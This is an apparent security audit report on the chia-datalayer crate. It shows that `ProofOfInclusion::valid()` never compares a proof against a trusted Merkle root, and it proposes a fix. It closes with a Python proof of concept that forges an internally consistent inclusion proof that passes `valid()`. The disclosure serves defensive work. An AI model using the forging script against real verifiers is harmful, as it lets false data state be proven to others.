### Title
`ProofOfInclusion::valid()` Final Root-Hash Check Is Tautologically True, Enabling Forged Inclusion Proof Acceptance — (`File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` validates each layer's hash chain internally but its final check `existing_hash == self.root_hash()` is a tautology — it is always `true` after the loop completes without returning `false`. The function never validates the proof against an external, trusted root hash. Any attacker-supplied `ProofOfInclusion` with an internally-consistent but fabricated chain (pointing to a fake root) will pass `valid()`.

### Finding Description

The `valid()` method in `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs` iterates over each `ProofOfInclusionLayer`, computing `calculate_internal_hash(existing_hash, side, other_hash)` and comparing it to `layer.combined_hash`. If they differ, it returns `false`. After the loop, `existing_hash` holds the last `calculated_hash`, which is guaranteed to equal the last `layer.combined_hash` (because the loop would have returned `false` otherwise). The final line then compares `existing_hash` to `self.root_hash()`, which is defined as `last.combined_hash`. These two values are identical by construction, so the final check is always `true`.

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash, layer.other_hash_side, &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash { return false; }
        existing_hash = calculated_hash;
    }
    existing_hash == self.root_hash()  // always true: existing_hash IS last.combined_hash
}
```

`root_hash()` returns `last.combined_hash` when layers are non-empty:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() { last.combined_hash } else { self.node_hash }
}
```

The function therefore only validates internal chain consistency. It never compares the computed root against any externally-known, trusted tree root. An attacker can construct a `ProofOfInclusion` whose `layers` chain is internally consistent but whose `root_hash()` is completely different from the actual `MerkleBlob` root, and `valid()` will return `true`.

`ProofOfInclusion` is a `Streamable` `pyclass` exposed via Python bindings, so it can be deserialized from untrusted bytes and its `valid()` method called directly from Python.

### Impact Explanation

This matches the High impact category: **DataLayer Merkle proof logic accepts forged inclusion/exclusion, letting untrusted input prove invalid state.**

Any consumer that calls `proof.valid()` as the sole check — without separately comparing `proof.root_hash()` to a known, trusted root — will accept a fabricated proof for a key-value pair that does not exist in the actual tree. This allows an attacker to prove false DataLayer state to a verifier.

### Likelihood Explanation

The `valid()` API name strongly implies complete proof validation. All internal tests and the fuzz target call `proof.valid()` without a separate root-hash comparison (because in those contexts the proof is generated from the same blob, so the root is implicitly correct). Any external consumer following the same pattern — calling only `valid()` — is vulnerable. The `ProofOfInclusion` type is `Streamable` and exposed via Python bindings, making it directly reachable from untrusted network input.

### Recommendation

`valid()` must accept a trusted root hash parameter and compare the computed root against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash, layer.other_hash_side, &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash { return false; }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root  // compare against external trusted root
}
```

Alternatively, rename the current `valid()` to `internally_consistent()` to make its limited scope explicit, and require callers to separately assert `proof.root_hash() == known_root`.

### Proof of Concept

```python
from chia_rs.datalayer import (
    MerkleBlob, ProofOfInclusion, ProofOfInclusionLayer, KeyId, ValueId
)
import hashlib

# Build a real tree with one entry
blob = MerkleBlob(bytearray())
key = KeyId(1)
val = ValueId(2)
h = hashlib.sha256(b"real").digest()
blob.insert(key, val, bytes(h))
blob.calculate_lazy_hashes()

real_proof = blob.get_proof_of_inclusion(key)
real_root = real_proof.root_hash()

# Forge a proof for a key that does NOT exist, with a fake root
fake_leaf_hash = bytes(hashlib.sha256(b"fake_leaf").digest())
fake_sibling   = bytes(hashlib.sha256(b"fake_sib").digest())
# Build an internally-consistent single-layer chain
import chia_rs.datalayer as dl
# compute combined_hash the same way the library does (left/right SHA256 concat)
# side=0 means other_hash is on the left
combined = hashlib.sha256(fake_sibling + fake_leaf_hash).digest()
layer = ProofOfInclusionLayer(
    other_hash_side=0,
    other_hash=bytes(fake_sibling),
    combined_hash=bytes(combined),
)
forged_proof = ProofOfInclusion(node_hash=bytes(fake_leaf_hash), layers=[layer])

assert forged_proof.valid()          # True — passes with a completely fake root
assert forged_proof.root_hash() != real_root  # root is different from the real tree
# A verifier calling only forged_proof.valid() is deceived.
